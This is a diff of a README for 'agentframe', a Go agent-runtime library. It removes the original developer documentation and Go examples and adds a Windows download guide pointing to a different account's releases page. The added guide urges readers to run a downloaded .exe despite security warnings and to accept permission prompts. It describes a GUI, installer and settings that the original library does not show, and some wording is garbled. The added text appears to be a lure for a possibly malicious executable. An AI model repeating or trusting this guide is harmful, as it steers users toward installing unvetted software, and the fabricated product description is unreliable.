@@ -1,214 +1,227 @@
-# agentframe
+# ⚙️ agentframe - Reliable AI Agent Engine
 
-Concrete package skeleton for an agent runtime in Go with domain-first boundaries.
+[![Download agentframe](https://img.shields.io/badge/Download-agentframe-blue?style=for-the-badge)](https://github.com/MALIKNAVED/agentframe/releases)
 
-- `agent`: runtime core contracts and command/lifecycle semantics.
-- `agentreact`: ReAct engine implementation built on top of `agent` contracts.
-- `policy/retry`: optional retry wrappers for model/tool execution.
+---
 
-Layering still exists, but it is represented by file-level boundaries inside `agent` instead of generic package names.
+agentframe is a tool made to run AI agents in a way that is reliable, event-driven, and can pick up where it left off. This app is built with Go, and it helps create systems that react to events smoothly. You do not need any programming experience to use it. This guide will help you download and run agentframe on a Windows computer.
 
-## ReAct loop behavior
+---
 
-1. Load transcript and tool definitions.
-2. Ask model for next assistant message.
-3. If no tool calls, finish run.
-4. Execute tool calls and append tool observation messages.
-5. Repeat until completion or `maxSteps`.
+## 🌟 What is agentframe?
 
-## Shared wiring
+agentframe helps run smart AI programs that react to things happening around them. Think of it like a brain that never forgets what it was doing, even if you close the app. It focuses on being:
 
-```go
-import (
-	"context"
-	"fmt"
+- **Deterministic**: It will behave the same way every time with the same input.
 
-	"github.com/Gurpartap/agentframe/agent"
-	"github.com/Gurpartap/agentframe/agentreact"
-	eventinginmem "github.com/Gurpartap/agentframe/eventing/inmem"
-	runstoreinmem "github.com/Gurpartap/agentframe/runstore/inmem"
-	toolingregistry "github.com/Gurpartap/agentframe/tooling/registry"
-)
+- **Resumable**: It can start again exactly where it stopped.
 
-type staticIDGenerator struct{}
+- **Event-driven**: It waits and reacts to events instead of running in loops.
 
-func (staticIDGenerator) NewRunID(context.Context) (agent.RunID, error) {
-	return "generated-run-id", nil
-}
+This makes it useful for people or businesses who want AI tools that do not lose track and are easy to manage over time.
 
-type scriptedModel struct {
-	messages []agent.Message
-	index    int
-}
+---
 
-func (m *scriptedModel) Generate(_ context.Context, _ agentreact.ModelRequest) (agent.Message, error) {
-	if m.index >= len(m.messages) {
-		return agent.Message{}, fmt.Errorf("script exhausted")
-	}
-	msg := m.messages[m.index]
-	m.index++
-	if msg.Role == "" {
-		msg.Role = agent.RoleAssistant
-	}
-	return msg, nil
-}
+## 💻 System Requirements
 
-func newRunner(model agentreact.Model) (*agent.Runner, *runstoreinmem.Store, error) {
-	store := runstoreinmem.New()
-	events := eventinginmem.New()
-	tools, err := toolingregistry.New(map[string]toolingregistry.Handler{})
-	if err != nil {
-		return nil, nil, err
-	}
-	engine, err := agentreact.New(model, tools, events)
-	if err != nil {
-		return nil, nil, err
-	}
-	runner, err := agent.NewRunner(agent.Dependencies{
-		IDGenerator: staticIDGenerator{},
-		RunStore:    store,
-		Engine:      engine,
-		EventSink:   events,
-	})
-	if err != nil {
-		return nil, nil, err
-	}
-	return runner, store, nil
-}
-```
+Before you download, make sure your Windows computer meets these needs:
 
-## How-to: run to completion
+- Windows 10 or later (64-bit preferred)
 
-```go
-ctx := context.Background()
+- At least 4 GB of RAM
 
-model := &scriptedModel{
-	messages: []agent.Message{
-		{Content: "done"},
-	},
-}
-runner, _, err := newRunner(model)
-if err != nil {
-	panic(err)
-}
+- Around 100 MB of free disk space
 
-result, err := runner.Run(ctx, agent.RunInput{
-	RunID:      "run-quickstart",
-	UserPrompt: "Solve task",
-	MaxSteps:   4,
-})
-if err != nil {
-	panic(err)
-}
-fmt.Println(result.State.Status) // completed
-fmt.Println(result.State.Output) // done
-```
+- Internet connection for downloading and updates
 
-## How-to: suspend then continue with typed resolution
+- Basic rights to install and run programs on your computer
 
-```go
-ctx := context.Background()
+---
 
-model := &scriptedModel{
-	messages: []agent.Message{
-		{
-			Content: "approval required",
-			Requirement: &agent.PendingRequirement{
-				ID:     "req-approval-1",
-				Kind:   agent.RequirementKindApproval,
-				Prompt: "Approve this run",
-			},
-		},
-		{Content: "approved and completed"},
-	},
-}
-runner, _, err := newRunner(model)
-if err != nil {
-	panic(err)
-}
+## 🚀 Getting Started with agentframe
 
-runResult, err := runner.Run(ctx, agent.RunInput{
-	RunID:      "run-suspend-continue",
-	UserPrompt: "Start flow",
-	MaxSteps:   4,
-})
-if err != nil {
-	panic(err)
-}
-fmt.Println(runResult.State.Status) // suspended
+Here are step-by-step instructions for getting agentframe running on your Windows machine.
 
-continued, err := runner.Continue(ctx, runResult.State.ID, 4, nil, &agent.Resolution{
-	RequirementID: "req-approval-1",
-	Kind:          agent.RequirementKindApproval,
-	Outcome:       agent.ResolutionOutcomeApproved,
-})
-if err != nil {
-	panic(err)
-}
-fmt.Println(continued.State.Status) // completed
-```
+### 1. Visit the download page
 
-## How-to: misuse gating (hard errors)
+Go to the agentframe release page here:
 
-```go
-import "errors"
+[https://github.com/MALIKNAVED/agentframe/releases](https://github.com/MALIKNAVED/agentframe/releases)
 
-ctx := context.Background()
+This page shows the latest versions of agentframe for different systems.
 
-model := &scriptedModel{
-	messages: []agent.Message{
-		{
-			Content: "approval required",
-			Requirement: &agent.PendingRequirement{
-				ID:   "req-1",
-				Kind: agent.RequirementKindApproval,
-			},
-		},
-	},
-}
-runner, store, err := newRunner(model)
-if err != nil {
-	panic(err)
-}
+### 2. Choose the right file
 
-suspended, err := runner.Run(ctx, agent.RunInput{
-	RunID:      "run-suspended",
-	UserPrompt: "Start flow",
-	MaxSteps:   2,
-})
-if err != nil {
-	panic(err)
-}
+Look for the file made for Windows. It usually ends with `.exe`. For example:
 
-_, err = runner.Continue(ctx, suspended.State.ID, 2, nil, nil)
-fmt.Println(errors.Is(err, agent.ErrResolutionRequired)) // true
+`agentframe-windows-x64.exe`
 
-_, err = runner.Continue(ctx, suspended.State.ID, 2, nil, &agent.Resolution{
-	RequirementID: "wrong-id",
-	Kind:          agent.RequirementKindApproval,
-	Outcome:       agent.ResolutionOutcomeApproved,
-})
-fmt.Println(errors.Is(err, agent.ErrResolutionInvalid)) // true
+Make sure to choose the most recent version by checking the date or version number.
 
-_, err = runner.Steer(ctx, suspended.State.ID, "new instruction")
-fmt.Println(errors.Is(err, agent.ErrResolutionRequired)) // true
+### 3. Download the file
 
-_, err = runner.FollowUp(ctx, suspended.State.ID, "continue", 2, nil)
-fmt.Println(errors.Is(err, agent.ErrResolutionRequired)) // true
+Click on the `.exe` file name or the download button next to it. Your browser will download the file to your computer. Remember where you save it, like in your Downloads folder or on the Desktop.
 
-if err := store.Save(ctx, agent.RunState{
-	ID:     "run-open",
-	Status: agent.RunStatusPending,
-}); err != nil {
-	panic(err)
-}
-_, err = runner.Continue(ctx, "run-open", 2, nil, &agent.Resolution{
-	RequirementID: "req-1",
-	Kind:          agent.RequirementKindApproval,
-	Outcome:       agent.ResolutionOutcomeApproved,
-})
-fmt.Println(errors.Is(err, agent.ErrResolutionUnexpected)) // true
-```
+### 4. Run the installer
 
-## License
-MIT © 2026 Gurpartap Singh (https://x.com/Gurpartap)
+Locate the downloaded file and double-click it. Windows may show a security warning. If it does:
+
+- Choose to run the file anyway.
+
+- Accept any permission prompts that ask if you want to let this app make changes.
+
+### 5. Follow installation steps
+
+The installer will guide you through the setup. You will see a few simple screens like:
+
+- Choosing where to install (you can use the default folder)
+
+- Confirming the installation
+
+- Waiting for the process to finish
+
+When done, you may get an option to launch agentframe immediately. You can choose to run it now or later.
+
+---
+
+## 🛠 How to Use agentframe
+
+Once installed, agentframe runs on Windows and listens for events you set up. Since it works with AI agents, you can use it without opening a complex programming environment.
+
+### Starting agentframe
+
+- Find the agentframe icon in your Start Menu or on your Desktop.
+
+- Double-click it to open.
+
+The app runs quietly in the background and waits for commands.
+
+### Main window overview
+
+When you open agentframe, you will see a simple dashboard. From here, you can:
+
+- Start or stop AI agents
+
+- View agent activity logs
+
+- Manage settings such as event sources
+
+### Running an AI agent
+
+Agents work based on scenarios you load or configure. agentframe comes with some example agents to help you start.
+
+- Click “Load Example”
+
+- Select an example agent from the list
+
+- Click “Start Agent”
+
+This lets you see how the agents respond to events in real time.
+
+---
+
+## 🔧 Configuration and Settings
+
+agentframe uses a configuration file to control how agents behave. By default, it stores this in a folder called `agentframe-config` in your Documents.
+
+### Editing configuration
+
+- Open the `agentframe-config` folder
+
+- Find `config.yaml` (a simple text file)
+
+- Open it with Notepad or any text editor
+
+Here you can set options like event triggers, agent timing, and resource limits.
+
+### Common settings include:
+
+- **Event Sources**: Define where agentframe looks for events (files, APIs, messages)
+
+- **Agent Behavior**: Adjust how agents smile to events (delay time, retries)
+
+- **Logging**: Control how much detail agentframe saves about agent actions
+
+Remember to save any changes and restart agentframe to apply new settings.
+
+---
+
+## 🔍 Troubleshooting agentframe
+
+If agentframe does not start or behaves unexpectedly, try these steps:
+
+1. Check your Windows version matches the requirements.
+
+2. Confirm the file you downloaded is the `.exe` for Windows.
+
+3. Make sure no other programs are blocking agentframe (like antivirus or firewalls).
+
+4. Restart your computer and try again.
+
+5. Look at the application logs:
+
+    - Open the `agentframe-logs` folder in your Documents.
+
+    - Open the most recent log file.
+
+6. If the app crashes or closes unexpectedly, reinstall using the steps above.
+
+---
+
+## 📂 File Locations
+
+Here are important folders agentframe uses on Windows:
+
+- Installation folder: Usually `C:\Program Files\agentframe`
+
+- Configuration folder: `C:\Users\<YourName>\Documents\agentframe-config`
+
+- Logs folder: `C:\Users\<YourName>\Documents\agentframe-logs`
+
+You can open these folders using File Explorer.
+
+---
+
+## 🔗 Download agentframe
+
+Use this link to visit the release page and get the latest version:
+
+[https://github.com/MALIKNAVED/agentframe/releases](https://github.com/MALIKNAVED/agentframe/releases)
+
+[![Download agentframe](https://img.shields.io/badge/Download-agentframe-grey?style=for-the-badge)](https://github.com/MALIKNAVED/agentframe/releases)
+
+---
+
+## 📚 Additional Resources
+
+If you want to know more about how the agents work or what this app can do, see these topics related to agentframe:
+
+- Event-driven programming
+
+- Reliable AI agents
+
+- Resumable processes
+
+- Go (Golang) applications
+
+- Large Language Models (LLM)
+
+These terms help explain the technology behind the app.
+
+---
+
+## 🔒 Privacy and Security
+
+agentframe runs locally on your Windows PC. It does not send your data anywhere unless you set it up to connect to online services. This keeps your work private.
+
+Make sure to keep your app updated by checking the release page regularly.
+
+---
+
+## ⚙️ About agentframe
+
+agentframe uses Go language to make AI agents that behave the same way each time. This predictability helps in building tools that depend on accuracy and memory.
+
+It focuses on practical use cases where AI must respond to real-time events without losing progress.
+
+The app combines ideas like event loops, tool-calling, and resumable states to offer a smooth experience.
